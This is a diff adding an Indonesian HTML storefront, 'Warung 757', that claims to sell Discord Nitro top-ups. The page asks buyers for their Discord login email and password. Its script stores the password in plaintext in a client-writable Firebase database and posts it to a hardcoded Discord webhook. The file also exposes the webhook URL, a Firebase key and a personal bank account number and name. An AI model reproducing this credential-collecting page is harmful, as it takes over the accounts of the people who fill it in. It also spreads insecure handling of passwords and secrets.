@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Discord Nitro Premium | Warung 757</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Lexend:wght@500;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --dark-blue: #0a0e27;
+            --discord-blurple: #5865F2;
+            --gold: #d4af37;
+            --gold-light: #f1d592;
+            --white: #ffffff;
+            --card-bg: #161b3d;
+            --error-red: #ff4d4d;
+            --font-title: 'Lexend', sans-serif;
+            --font-body: 'Inter', sans-serif;
+        }
+
+        body {
+            background: var(--dark-blue);
+            background-image: radial-gradient(circle at center, #16215b 0%, #0a0e27 100%);
+            color: var(--white);
+            min-height: 100vh;
+            padding-bottom: 120px;
+            font-family: var(--font-body);
+            -webkit-font-smoothing: antialiased;
+        }
+
+        h1, h2, h3, h4, .step-num, .method-price, .btn-order, #footerPrice, .total-info h2 {
+            font-family: var(--font-title);
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            50% { transform: translateX(8px); }
+            75% { transform: translateX(-8px); }
+        }
+
+        .shake-error {
+            animation: shake 0.4s ease-in-out;
+            border-color: var(--error-red) !important;
+            box-shadow: 0 0 15px rgba(255, 77, 77, 0.4) !important;
+        }
+
+        #loader {
+            position: fixed; width: 100%; height: 100%; background: var(--dark-blue);
+            display: flex; justify-content: center; align-items: center; z-index: 9999;
+        }
+        .coda-spinner {
+            width: 50px; height: 50px; border: 4px solid rgba(212, 175, 55, 0.1);
+            border-top: 4px solid var(--gold); border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .header { padding: 15px 20px; display: flex; align-items: center; gap: 15px; background: rgba(0,0,0,0.3); border-bottom: 1px solid rgba(212,175,55,0.1); }
+        .header h2 { font-size: 1.1rem; font-weight: 800; color: var(--gold); letter-spacing: 1px; }
+
+        .container { max-width: 1100px; margin: 20px auto; padding: 0 15px; display: grid; grid-template-columns: 1fr; gap: 20px; }
+        
+        @media (min-width: 992px) {
+            .container { grid-template-columns: 400px 1fr; }
+            .left-side { position: sticky; top: 20px; align-self: start; }
+        }
+
+        .section-card { background: var(--card-bg); border-radius: 12px; padding: 25px; border: 1px solid rgba(255, 255, 255, 0.05); margin-bottom: 20px; transition: all 0.3s ease; }
+        
+        .step-header { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
+        .step-num { width: 32px; height: 32px; background: var(--gold); color: var(--dark-blue); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.95rem; flex-shrink: 0; }
+        .step-header h3 { font-size: 1.1rem; font-weight: 700; color: var(--white); }
+
+        .input-box { width: 100%; padding: 14px; background: #0a0e27; border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 10px; color: white; margin-bottom: 12px; outline: none; transition: 0.3s; font-family: var(--font-body); font-size: 0.9rem; }
+        .input-box:focus { border-color: var(--gold); background: #000; }
+
+        .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
+        .price-item { 
+            position: relative;
+            background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); 
+            border-radius: 10px; padding: 15px; cursor: pointer; text-align: center; transition: 0.2s;
+            overflow: visible;
+        }
+        .price-item.active { border-color: var(--gold); background: rgba(212, 175, 55, 0.08); transform: translateY(-2px); }
+        .price-item h4 { font-size: 0.8rem; margin-bottom: 4px; font-weight: 500; color: rgba(255,255,255,0.7); }
+        .price-item p { font-size: 0.95rem; font-weight: 700; color: var(--gold); }
+
+        .payment-list { display: flex; flex-direction: column; gap: 10px; }
+        .method-item { 
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 14px 18px; background: rgba(0,0,0,0.25); border: 1px solid rgba(255,255,255,0.08); border-radius: 10px; cursor: pointer; transition: 0.2s;
+        }
+        .method-item.active { border-color: var(--gold); background: rgba(212, 175, 55, 0.08); }
+        .method-item img { height: 18px; filter: grayscale(0.2); }
+        .method-price { font-weight: 600; color: var(--white); font-size: 0.95rem; }
+
+        .footer-action {
+            position: fixed; bottom: 0; left: 0; width: 100%; background: #0a0e27;
+            padding: 18px 5%; border-top: 1px solid rgba(212,175,55,0.2);
+            display: flex; justify-content: space-between; align-items: center; z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+        .total-info p { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.6; margin-bottom: 2px; }
+        .total-info h2 { font-size: 1.4rem; color: var(--gold); font-weight: 700; }
+        .btn-order { background: var(--gold); color: var(--dark-blue); padding: 12px 28px; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 1rem; transition: 0.3s; }
+        .btn-order:active { transform: scale(0.96); }
+
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 2000; padding: 20px; backdrop-filter: blur(5px); }
+        .modal-content { background: var(--card-bg); width: 100%; max-width: 380px; border-radius: 16px; padding: 25px; border: 1px solid rgba(212,175,55,0.3); text-align: center; }
+        .upload-zone { margin: 18px 0; padding: 20px; border: 2px dashed rgba(212,175,55,0.3); border-radius: 12px; cursor: pointer; background: rgba(0,0,0,0.2); transition: 0.3s; }
+
+        .notif-container { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 380px; background: white; padding: 12px; border-radius: 12px; z-index: 10000; display: flex; align-items: center; gap: 12px; transition: 0.5s; box-shadow: 0 10px 25px rgba(0,0,0,0.4); color: #333; }
+        .notif-container.show { top: 20px; }
+        .notif-text h4 { font-weight: 700; font-size: 0.9rem; }
+        .notif-text p { font-size: 0.8rem; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div id="loader"><div class="coda-spinner"></div></div>
+
+    <div class="header">
+        <a href="index.html" style="color: var(--gold); font-size: 1.1rem;"><i class="fas fa-chevron-left"></i></a>
+        <h2>WARUNG 757</h2>
+    </div>
+
+    <div class="container">
+        <div class="left-side">
+            <div class="section-card">
+                <h2 style="font-size: 1.3rem; margin-bottom: 8px; font-weight: 700;">Discord Nitro & Boost</h2>
+                <p style="font-size: 0.85rem; opacity: 0.7; line-height: 1.6; margin-bottom: 18px;">
+                    Layanan pengisian Discord Nitro Premium & Server Boost. Proses secepat kilat.
+                    <br><strong style="color: var(--gold);">Proses manual melalui Admin 757.</strong>
+                </p>
+                <div style="font-size: 0.8rem; color: var(--gold-light); display: grid; gap: 6px; opacity: 0.9;">
+                    <div><i class="fas fa-check-circle" style="width: 20px;"></i> Proses sesuai antrian</div>
+                    <div><i class="fas fa-check-circle" style="width: 20px;"></i> Full Support 24 Jam</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-side">
+            <div class="section-card" id="card-step-1">
+                <div class="step-header">
+                    <div class="step-num">1</div>
+                    <h3>Masukkan Data Akun</h3>
+                </div>
+                <input type="text" id="dsc-user" class="input-box" placeholder="Email / No. HP Discord">
+                <input type="password" id="dsc-pass" class="input-box" placeholder="Password Discord">
+            </div>
+
+            <div class="section-card" id="card-step-2">
+                <div class="step-header">
+                    <div class="step-num">2</div>
+                    <h3>Pilih Paket Nitro</h3>
+                </div>
+                <div class="product-grid" id="productContainer">
+                    <div style="color: var(--gold); font-size: 0.85rem; opacity: 0.8;">Memuat paket...</div>
+                </div>
+            </div>
+
+            <div class="section-card" id="card-step-3">
+                <div class="step-header">
+                    <div class="step-num">3</div>
+                    <h3>Pilih Pembayaran</h3>
+                </div>
+                <div class="payment-list">
+                    <div class="method-item" onclick="selectMetode(this, 'QRIS ALL PAYMENT')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Logo_QRIS.svg">
+                        <span class="method-price" id="p-qris">Rp -</span>
+                    </div>
+                    <div class="method-item" onclick="selectMetode(this, 'BCA')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Bank_Central_Asia.svg">
+                        <span class="method-price" id="p-bca">Rp -</span>
+                    </div>
+                    <div class="method-item" onclick="selectMetode(this, 'QRIS DANA ONLY')">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg">
+                        <span class="method-price" id="p-dana">Rp -</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="card-step-4">
+                <div class="step-header">
+                    <div class="step-num">4</div>
+                    <h3>Konfirmasi Kontak</h3>
+                </div>
+                <input type="email" id="dsc-wa" class="input-box" placeholder="Masukkan Alamat Email Aktif">
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-action">
+        <div class="total-info">
+            <p>Total Tagihan</p>
+            <h2 id="footerPrice">Rp 0</h2>
+        </div>
+        <button class="btn-order" onclick="openPayment()">Beli Sekarang</button>
+    </div>
+
+    <div class="modal-overlay" id="modalPayment">
+        <div class="modal-content">
+            <h2 style="font-size: 1.1rem; color: var(--gold); font-weight: 700;">Konfirmasi Pembayaran</h2>
+            <p id="textTotal" style="font-size: 1.5rem; font-weight: 800; color: #fff; margin: 12px 0;"></p>
+            
+            <div id="qrArea" style="display:none; margin: 12px 0;">
+                <div style="background: white; padding: 10px; border-radius: 12px; display: inline-block;">
+                    <img id="qrImg" src="" style="width: 180px;">
+                </div>
+            </div>
+            
+            <div id="bankArea" style="display:none; padding: 20px 0;">
+                <h2 style="letter-spacing: 1px; color: var(--gold-light); font-size: 1.4rem;">4600518033</h2>
+                <p style="font-size: 0.9rem; font-weight: 500; font-family: var(--font-body); opacity: 0.8;">A/N RIAN APANDI</p>
+            </div>
+
+            <div class="upload-zone" id="up-zone" onclick="document.getElementById('file-bukti').click()">
+                <i class="fas fa-cloud-upload-alt" style="font-size: 1.8rem; color: var(--gold); margin-bottom: 8px;"></i><br>
+                <span id="up-text" style="font-size: 0.8rem; color: var(--gold-light); font-weight: 600;">Upload Bukti Bayar</span>
+                <input type="file" id="file-bukti" hidden accept="image/*" onchange="showFile(this)">
+            </div>
+
+            <div style="display: flex; gap: 10px;">
+                <button onclick="document.getElementById('modalPayment').style.display='none'" style="flex:1; padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,0.1); background:transparent; color:white; font-size: 0.9rem;">Batal</button>
+                <button onclick="processDsc()" style="flex:2; padding:12px; border-radius:10px; background:var(--gold); border:none; font-weight: 700; color:var(--dark-blue); font-size: 0.9rem;">Konfirmasi</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="notif-container" id="pushNotif">
+        <div style="background: var(--gold); padding: 8px; border-radius: 8px; color: var(--dark-blue);"><i class="fas fa-box"></i></div>
+        <div class="notif-text">
+            <h4>WARUNG 757</h4>
+            <p>Transaksi sedang diproses!</p>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
+        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBDU-cVQatcbyA-RSM-zftZf1NH5q9fcFI",
+            authDomain: "warung-757.firebaseapp.com",
+            projectId: "warung-757",
+            databaseURL: "https://warung-757-default-rtdb.firebaseio.com"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // AMBIL DATA DARI PATH ADMIN
+        onValue(ref(db, 'settings/discord_prices'), (snapshot) => {
+            const container = document.getElementById('productContainer');
+            container.innerHTML = "";
+            const data = snapshot.val();
+            if (data) {
+                data.forEach((item, index) => {
+                    const div = document.createElement('div');
+                    div.className = "price-item";
+                    
+                    div.onclick = function() { selectPkg(this, item.name, item.price); };
+                    div.innerHTML = `
+                        <h4>${item.name}</h4>
+                        <p>Rp ${parseInt(item.price).toLocaleString('id-ID')}</p>
+                    `;
+                    container.appendChild(div);
+                });
+            } else {
+                container.innerHTML = "<div style='color: var(--gold); font-size: 0.85rem;'>Belum ada produk tersedia.</div>";
+            }
+        });
+
+        window.onload = () => { setTimeout(() => { document.getElementById('loader').style.display = 'none'; }, 1000); };
+
+        let selected = null;
+        let chosenMethod = null;
+
+        function triggerShake(elementId) {
+            const el = document.getElementById(elementId);
+            el.classList.add('shake-error');
+            setTimeout(() => { el.classList.remove('shake-error'); }, 400);
+        }
+
+        window.selectPkg = (el, name, price) => {
+            selected = { name, price };
+            document.querySelectorAll('.price-item').forEach(i => i.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('card-step-2').classList.remove('shake-error');
+            const p = "Rp " + parseInt(price).toLocaleString('id-ID');
+            document.getElementById('p-qris').innerText = p;
+            document.getElementById('p-bca').innerText = p;
+            document.getElementById('p-dana').innerText = p;
+            document.getElementById('footerPrice').innerText = p;
+        };
+
+        window.selectMetode = (el, m) => {
+            chosenMethod = m;
+            document.querySelectorAll('.method-item').forEach(i => i.classList.remove('active'));
+            el.classList.add('active');
+            document.getElementById('card-step-3').classList.remove('shake-error');
+        };
+
+        window.openPayment = () => {
+            let isValid = true;
+            if(!document.getElementById('dsc-user').value || !document.getElementById('dsc-pass').value) { triggerShake('card-step-1'); isValid = false; }
+            if(!selected) { triggerShake('card-step-2'); isValid = false; }
+            if(!chosenMethod) { triggerShake('card-step-3'); isValid = false; }
+            if(!document.getElementById('dsc-wa').value) { triggerShake('card-step-4'); isValid = false; }
+            if(!isValid) return;
+
+            document.getElementById('textTotal').innerText = "Rp " + parseInt(selected.price).toLocaleString('id-ID');
+            document.getElementById('modalPayment').style.display = 'flex';
+            
+            if(chosenMethod === "BCA") {
+                document.getElementById('qrArea').style.display = 'none'; document.getElementById('bankArea').style.display = 'block';
+            } else {
+                document.getElementById('bankArea').style.display = 'none'; document.getElementById('qrArea').style.display = 'block';
+                document.getElementById('qrImg').src = (chosenMethod === "QRIS DANA ONLY") ? "https://i.ibb.co/s9dtdcP9/qr-ID1022167478307-25-02-26-177195989-1771959903434.jpg" : "https://i.ibb.co/6RcGf5ZC/1772040416685.png";
+            }
+        };
+
+        window.showFile = (input) => {
+            if(input.files[0]) {
+                document.getElementById('up-text').innerText = "✓ " + input.files[0].name;
+                document.getElementById('up-zone').style.borderColor = "#00ff88";
+            }
+        };
+
+        window.processDsc = async () => {
+            const file = document.getElementById('file-bukti').files[0];
+            if(!file) { triggerShake('up-zone'); return; }
+
+            Swal.fire({ 
+                title: 'Menyimpan Transaksi...', 
+                allowOutsideClick: false, 
+                background: '#0a0e27', 
+                color: '#fff', 
+                didOpen: () => { Swal.showLoading(); } 
+            });
+
+            const trxId = "DSC-" + Date.now().toString().slice(-6);
+            const now = new Date();
+            const data = {
+                id: trxId, 
+                user: document.getElementById('dsc-user').value, 
+                pass: document.getElementById('dsc-pass').value,
+                wa: document.getElementById('dsc-wa').value, 
+                product: selected.name, 
+                price: selected.price,
+                method: chosenMethod, 
+                status: "DIPROSES", 
+                timestamp: now.getTime(),
+                date: now.toLocaleString('id-ID')
+            };
+
+            try {
+                await set(ref(db, 'transactions/' + trxId), data);
+                
+                let history = JSON.parse(localStorage.getItem('zepetoHistory')) || [];
+                history.unshift({
+                    id: trxId, product: data.product, price: data.price, status: "DIPROSES", date: data.date
+                });
+                localStorage.setItem('zepetoHistory', JSON.stringify(history));
+
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify({ 
+                    embeds: [{ 
+                        title: "🚀 ORDER DISCORD - " + trxId, 
+                        color: 5763719,
+                        fields: [
+                            { name: "Produk", value: data.product },
+                            { name: "User/Email", value: data.user },
+                            { name: "Password", value: "||" + data.pass + "||" },
+                            { name: "Kontak", value: data.wa },
+                            { name: "Metode", value: data.method },
+                            { name: "Total Bayar", value: "Rp " + parseInt(data.price).toLocaleString('id-ID') }
+                        ] 
+                    }] 
+                }));
+                formData.append('file', file);
+                
+                fetch("https://discord.com/api/webhooks/1476148004972134462/VcP12OAX0FNA0H27B9ohD0FRUsT3nDA6-NN8AUIaBMBgdxkhp6Y92-6LTQE3sxy6gqb1", { 
+                    method: 'POST', 
+                    body: formData 
+                });
+
+                document.getElementById('modalPayment').style.display = 'none';
+                Swal.close();
+                document.getElementById('pushNotif').classList.add('show');
+                
+                setTimeout(() => { 
+                    window.location.href = 'riwayat-transaksi.html'; 
+                }, 2000);
+            } catch(e) { 
+                console.error(e);
+                Swal.fire({ icon: 'error', title: 'Gagal!', text: 'Terjadi kesalahan saat menyimpan data.' });
+            }
+        };
+    </script>
+    <script src="script.js"></script>
+</body>
+</html>
